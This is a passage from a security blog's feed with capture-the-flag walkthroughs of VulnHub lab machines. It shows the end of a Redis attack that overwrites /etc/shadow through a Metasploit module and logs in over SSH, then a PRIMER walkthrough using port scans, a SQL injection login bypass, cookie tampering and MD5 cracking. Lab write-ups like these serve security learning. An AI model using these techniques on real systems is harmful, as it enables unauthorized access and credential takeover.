</span><span class='line'>   Password                foobared               no        Redis password <span class="k">for</span> authentication <span class="nb">test</span>
</span><span class='line'><span class="nb">   </span>RHOSTS                  10.1.1.128             yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT                   <span class="m">6379</span>                   yes       The target port
</span><span class='line'>   RemoteFile              /etc/shadow            no        Remote file path
</span><span class='line'>   THREADS                 <span class="m">1</span>                      yes       The number of concurrent threads
</span><span class='line'>
</span><span class='line'>msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt; exploit
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> 10.1.1.128:6379 -- saved <span class="m">1103</span> bytes inside of redis DB at /etc/shadow
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>file_upload<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure>


<p>and then SSH login to <code>user</code> or <code>admin</code> with the password we set.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -p <span class="m">1322</span> admin@10.1.1.128
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  G:                ,<span class="p">;</span>
</span><span class='line'>  E#,    :        f#i                        .Gt  t    j.
</span><span class='line'>  E#t  .GE      .E#t                        j#W:  Ej   EW,
</span><span class='line'>  E#t j#K<span class="p">;</span>     i#W,     t      .DD.       <span class="p">;</span>K#f    E#,  E##j
</span><span class='line'>  E#GK#f      L#D.      EK:   ,WK.      .G#D.     E#t  E###D.
</span><span class='line'>  E##D.     :K#Wfff<span class="p">;</span>    E#t  i#D       j#K<span class="p">;</span>       E#t  E#jG#W<span class="p">;</span>
</span><span class='line'>  E##Wi     i##WLLLLt   E#t j#f      ,K#f   ,GD<span class="p">;</span>  E#t  E#t t##f
</span><span class='line'>  E#jL#D:    .E#L       E#tL#i        j#Wi   E#t  E#t  E#t  :K#E:
</span><span class='line'>  E#t ,K#j     f#E:     E#WW,          .G#D: E#t  E#t  E#KDDDD###i
</span><span class='line'>  E#t   jD      ,WW<span class="p">;</span>    E#K:             ,K#fK#t  E#t  E#f,t#Wi,,,
</span><span class='line'>  j#t            .D#<span class="p">;</span>   ED.                j###t  E#t  E#t  <span class="p">;</span><span class="c">#W:  </span>
</span><span class='line'>   ,<span class="p">;</span>              tt   t                   .G#t  E#t  DWi   ,KK:
</span><span class='line'>                                              <span class="p">;;</span>  ,<span class="p">;</span>.
</span><span class='line'>
</span><span class='line'>                                                   by canyoupwn.me
</span><span class='line'>
</span><span class='line'>admin@10.1.1.128<span class="s1">&#39;s password: </span>
</span><span class='line'><span class="s1">Permission denied, please try again.</span>
</span><span class='line'><span class="s1">admin@10.1.1.128&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'>  System information as of Sat May <span class="m">28</span> 15:45:06 EEST 2016
</span><span class='line'>
</span><span class='line'>  System load:  0.0               Processes:           174
</span><span class='line'>  Usage of /:   32.5% of 6.50GB   Users logged in:     1
</span><span class='line'>  Memory usage: 30%               IP address <span class="k">for</span> eth0: 10.1.1.128
</span><span class='line'>  Swap usage:   0%
</span><span class='line'>
</span><span class='line'>  Graph this data and manage this system at:
</span><span class='line'>    https://landscape.canonical.com/
</span><span class='line'>
</span><span class='line'><span class="m">151</span> packages can be updated.
</span><span class='line'><span class="m">79</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>Last login: Sat May <span class="m">28</span> 15:44:57 <span class="m">2016</span> from 10.1.1.130
</span><span class='line'>admin@canyoupwnme:~<span class="nv">$ </span><span class="nb">exit</span>
</span><span class='line'><span class="nb">logout</span>
</span><span class='line'>Connection to 10.1.1.128 closed.
</span></code></pre></td></tr></table></div></figure>


<p>Now I can login as admin!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PRIMER:1.0.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1/"/>
    <updated>2016-04-12T22:43:27+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/04/12/vulnhub-primer-1-dot-0-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Teach some basic well known techniques and attacks. Spark some curiosity, make the user look at the source code and try to figure out what&rsquo;s going on behind the scenes. The main goal is to give a nice welcoming intro to the scene and hopefully also teach something about ethics and responsibility.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/arne-rick,217/">Arne Rick(@couchsofa)</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/primer-101,136/">here</a> or <a href="http://wiki.fablab-karlsruhe.de/doku.php?id=projekte:primer">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: PRIMER: 1.0.1 (<em>10.1.1.151/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<p>There is no acutal Vulnerabilities (except a simple SQL injection), all you need to do to take down this VM is Enumeration and more enumberation.</p>

<ul>
<li>Checking source code / comments</li>
<li>Enumeration, Enumeration and more Enumeration</li>
<li>Puzzle cracking</li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.151    00:0c:29:ad:7e:f2   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:f4:51:9f   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.859 seconds <span class="o">(</span>89.54 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.151</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.151/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-01-22 23:48:47 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.151
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.151
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.151
</span><span class='line'>Discovered open port 33786/tcp on 10.1.1.151
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Fri Jan 22 18:50:28 2016 as: nmap -sV -A -O -p 22,80,111,33786 -v -oN 10.1.1.151_nmap.txt 10.1.1.151</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.151
</span><span class='line'>Host is up <span class="o">(</span>0.00077s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 01:2e:60:5f:99:48:3b:2f:c0:72:c6:ae:48:02:5e:33 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ed:26:be:cc:c6:2a:93:d1:e1:6d:0d:5a:53:7b:4d:fb <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 7f:4e:64:a0:c4:8a:13:8e:e9:86:3d:5d:49:04:c4:54 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span>_http-methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
</span><span class='line'><span class="p">|</span>_/4_8f14e45fceea167a5a36dedd4bea2543
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: PRIMER
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
</span><span class='line'>33786/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          33786/tcp  status
</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          36908/udp  status
</span><span class='line'>MAC Address: 00:0C:29:AD:7E:F2 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Fri Jan <span class="m">22</span> 18:49:50 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">261</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.77 ms 10.1.1.151
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'><span class="c"># Nmap done at Fri Jan 22 18:50:44 2016 -- 1 IP address (1 host up) scanned in 16.87 seconds</span>
</span></code></pre></td></tr></table></div></figure>


<p>Four ports are found: <code>22, 80, 111, 33786</code> and a hidden folder <code>/4_8f14e45fceea167a5a36dedd4bea2543</code> is found in <code>robots.txt</code>.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80 found by port-scanning stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.151
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /, fields: 0x16ef 0x522ed6bcd00c0
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Entry <span class="s1">&#39;/4_8f14e45fceea167a5a36dedd4bea2543/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
</span><span class='line'>+ GET <span class="s2">&quot;robots.txt&quot;</span> contains <span class="m">1</span> entry which should be manually viewed.
</span><span class='line'>+ OPTIONS Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;x-ob_mode&#39;</span> found, with contents: 0
</span><span class='line'>+ OSVDB-3092: GET /manual/: Web server manual found.
</span><span class='line'>+ OSVDB-3268: GET /manual/images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /phpmyadmin/: phpMyAdmin directory found
</span></code></pre></td></tr></table></div></figure>


<p>This result approved the finding from NMAP scan and also found a new folder <code>/phpmyadmin/</code>.</p>

<p>Now open firefox to check the WEB application.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/1.png"></p>

<h3>Part 1: [PRIMER]</h3>

<h4>charpter 1: [<strong>init</strong>]</h4>

<p>On the first page, here is a login form. After playing with this page for a while such as checking source code, try weak passwords&hellip; but nothing found.
I decided to test some basic SQL injection, and it is vulnerable!</p>

<p>type the following in username and any rubbish in password, and then submit the form to bypass the login.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">Username</span> <span class="o">=</span> <span class="err">&#39;</span> or <span class="nv">1</span><span class="o">=</span><span class="m">1</span> -- -
</span><span class='line'><span class="nv">Password</span> <span class="o">=</span> xxxxxx
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/2.png"></p>

<h4>chapter 2: [(α=β)&lt;=>(α&lt;=>β)]</h4>

<p>By checking the source code, I noticed the following comments:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;!-- This bot was looking <span class="k">for</span> a Sosū User Agent Identifier she had cracked weeks ago, easy sauce, just a simple md5 <span class="nb">hash </span>of the first <span class="m">7</span> digits of pi. It was basically common knowledge to the entities moving in these areas but obscurity does create a, albeit virtual, layer of security. --&gt;
</span></code></pre></td></tr></table></div></figure>


<p><font color="red"><strong>[note!!]</strong></font> However, here should be the md5 hash value of the first digit of pi&hellip;</p>

<p><code>md5(3) = eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>

<p>So the next level should be <code>2_eccbc87e4b5ce2fe28308fd9f2a7baf3</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/3.png"></p>

<h4>chapter 3: [&ldquo;[^&rdquo;\r\n]*&ldquo;]</h4>

<p>By checking the source code, I found there is another file <code>style.css</code>. and the hint just hidden in its source code.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/*Clean sessions terminate without leaving things behind. Some are cleaner than others and some are really dirty to begin with. *Programming is an art form, even in the age of the n3t people still make mistakes. *Sometimes, an exploit is as simple as changing a simple value in a <span class="nb">local </span>file. *Piece of cake! */
</span></code></pre></td></tr></table></div></figure>


<p><code>simple value in a local file</code>, well the first thing need to be check is the cookie!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/4.png"></p>

<p>The sessoin cookie&rsquo;s value <code>activeSession</code> is <code>false</code>. Let&rsquo;s change it to <code>true</code> and refresh the page. and bingo~~</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/5.png"></p>

<h4>Chapter 4: [:(){ :|:&amp;};:]</h4>

<p>This one has been found in nmap scanning phrase, which is found in robots.txt file.</p>

<p><code>http://10.1.1.151/4_8f14e45fceea167a5a36dedd4bea2543/</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/6.png"></p>

<h3>Part 2: [FORK]</h3>

<p>nothing interesting, click <code>EOF</code> will send me to another layer/page:</p>

<p><code>http://10.1.1.151/5_6512bd43d9caa6e02c990b0a82652dca/</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/7.png"></p>

<h4>Chapter 5: [0xC00007B]</h4>

<p>Well, the answer is obvious that <code>/6_c51ce410c124a10e0db5e4b97fc2af39</code>. So keep moving on:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/8.png"></p>

<p>Here is interesting, Burp proxy and wireshark could not catch anything when I visit <code>http://10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/</code> when I got the password window pop up.</p>

<p>So I try to use curl to check what exactly happened.</p>

<p>based on the respond from the server, I noticed the following javascript code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">root</span><span class="err">@</span><span class="nx">kali</span><span class="o">:~</span><span class="err">#</span> <span class="nx">curl</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//10.1.1.151/6_c51ce410c124a10e0db5e4b97fc2af39/</span>
</span><span class='line'>
</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&quot;JavaScript&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">X</span><span class="p">;</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="s2">&quot;Ikdf076&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="s1">&#39;/()=&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span> <span class="o">===</span> <span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">X</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="nx">L</span><span class="p">){}</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&quot;./_.php&quot;</span><span class="p">;}</span>
</span><span class='line'><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>analyzed the script, we know that the password is any string which include the pattern <code>Ikdf076</code> since the third latter. such as <code>xxIkdf076xxxx</code>.</p>

<p>So I entered <code>12Ikdf076</code> to bypass the login window and got the next level&rsquo;s entry: <code>7_70efdf2ec9b086079795c442636b55fb</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/9.png"></p>

<h4>Chapter 6: [++Q++++++]</h4>

<p>Now let&rsquo;s move to next level, another input window pop up&hellip;</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/10.png"></p>

<p>Use <code>curl</code> again and from the responded source code, I found the following hints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span><span class='line'><span class="cm">/*&quot;Someone didn&#39;t bother reading my carefully prepared memo on commonly-used passwords. Now, then, as I so meticulously pointed out, the four most-used passwords are: love, sex, secret, and...&quot; - The Plague*/</span>
</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>and</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">X</span><span class="p">;</span><span class="kd">var</span> <span class="nx">L</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span><span class="nx">X</span><span class="o">=</span><span class="nx">prompt</span><span class="p">(</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">10</span><span class="p">],</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="nx">X</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">X</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">===</span><span class="kc">null</span><span class="p">){</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span><span class="k">if</span><span class="p">(</span><span class="nx">X</span><span class="o">==</span><span class="nx">L</span><span class="p">){}</span><span class="k">else</span> <span class="p">{</span><span class="nb">window</span><span class="p">[</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">11</span><span class="p">]]</span><span class="o">=</span><span class="nx">_0x5cf4</span><span class="p">[</span><span class="mi">12</span><span class="p">]};</span>
</span><span class='line'><span class="p">...</span><span class="nx">turncate</span><span class="p">...</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the comments above, If you have watched the movie <code>Hackers</code> published in 1995, you will know the 4th most-used password here is <code>god</code> :P</p>

<p>From the source code, here we know that <code>X</code> is the md5 value of my input and if <code>X</code> equal to <code>L</code> then the typed password is correct. so we can crack <code>L</code> to get the password.</p>

<p>Using <code>firebug</code> addon, we get the L&rsquo;s value, which is <code>0d28cba0bd4f26e16d766000d27e49fa</code>. After cracked this md5 value, I got the password: <code>GOD</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/11.png"></p>

<p>Now input <code>GOD</code> to bypass this level.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/12.png"></p>

<h4>Chapter 7: [KS(x)&lt;=l(x)+4]</h4>

<p>really stuck here for a while&hellip;</p>

<p>back to the details&hellip;</p>

<p>There are 7 md5 hashes collected from URLs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>1_c81e728d9d4c2f636f067f89cc14862c
</span><span class='line'>2_eccbc87e4b5ce2fe28308fd9f2a7baf3
</span><span class='line'>3_e4da3b7fbbce2345d7772b0674a318d5
</span><span class='line'>4_8f14e45fceea167a5a36dedd4bea2543
</span><span class='line'>5_6512bd43d9caa6e02c990b0a82652dca
</span><span class='line'>6_c51ce410c124a10e0db5e4b97fc2af39
</span><span class='line'>7_70efdf2ec9b086079795c442636b55fb
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/13.png"></p>

<p>After cracked these md5 hashes and according to the clue from the Title <code>Primer</code>, I guess the 8th URL md5 hash would be <code>8_</code> followed by the value of md5(&lsquo;19&rsquo;): <code>1f0e3dad99908345f7439f8ffabdffc4</code></p>

<p><code>8_1f0e3dad99908345f7439f8ffabdffc4</code></p>

<p>and this took me to the deeper layer @_@</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/14.png"></p>

<p>This page contains a link to next one: <code>http://10.1.1.151/9_37693cfc748049e45d87b8c7d8b9aacd</code></p>

<p>Click <code>EOF</code> and I got the following page:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/primer101/15.png"></p>

